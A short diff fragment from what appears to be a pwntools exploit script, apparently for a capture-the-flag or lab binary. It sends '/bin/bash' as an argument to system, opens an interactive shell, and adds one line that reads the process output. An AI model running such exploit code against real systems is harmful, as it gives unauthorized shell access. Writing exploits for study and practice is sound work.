@@ -39,4 +39,5 @@ payload=b"/bin/bash"
 log.info("passing /bin/bash as argument to system")
 print("SHELLY on the way !") 
 p.sendline(payload)
+p.recvline()
 p.interactive()
